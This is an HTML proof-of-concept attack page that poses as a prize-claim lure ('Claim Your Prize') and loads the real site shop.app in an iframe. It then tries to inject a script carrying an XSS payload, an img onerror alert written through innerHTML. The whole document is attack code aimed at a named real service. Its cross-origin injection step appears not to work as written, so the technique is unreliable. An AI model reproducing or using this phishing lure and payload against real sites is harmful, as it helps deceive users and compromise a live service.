<body>
  <h1>You've won a prize!</h1>
  <p>Click below to claim it on Shop.app!</p>
  <button onclick="startAttack()">Claim Your Prize</button>

  <iframe id="victimFrame" style="width: 800px; height: 400px; border: 2px solid red;"></iframe>
  <!-- Make it visible for debugging -->

  <script>
    function startAttack() {
      const frame = document.getElementById('victimFrame');
      // Load the target site FIRST
      frame.src = "https://shop.app/"; // Start with a clean page

      frame.onload = function() {
        // Wait for the iframe to fully load, including its JS
        setTimeout(() => {
          // STEP 1: Get access to the iframe's document
          const frameDoc = frame.contentDocument || frame.contentWindow.document;

          // STEP 2: Create a new <script> element INSIDE the iframe
          const script = frameDoc.createElement('script');
          // STEP 3: Set the script's content to YOUR PROVEN POC CODE
          script.textContent = `
            // Your exact PoC code here
            let maliciousHash = "#<img src=x onerror='alert(\\\\"XSS on: \\\\" + document.domain)'>";
            let encodedHash = encodeURIComponent(maliciousHash.substring(1));
            encodedHash = '#' + encodedHash;
            console.log("What location.hash returns:", encodedHash);

            try {
              let decodedPayload = decodeURIComponent(encodedHash.substring(1));
              console.log("After decodeURIComponent:", decodedPayload);

              console.log("Testing innerHTML sink...");
              let testDiv = document.createElement('div');
              document.body.appendChild(testDiv);
              testDiv.innerHTML = decodedPayload; // This should fire the alert

            } catch(e) {
              console.error("Error:", e);
            }
          `;

          // STEP 4: Inject the script into the iframe's head/body
          (frameDoc.head || frameDoc.documentElement).appendChild(script);
          console.log("Injected PoC script into iframe.");

        }, 2000); // Give the target site time to fully initialize
      };
    }
  </script>
</body>
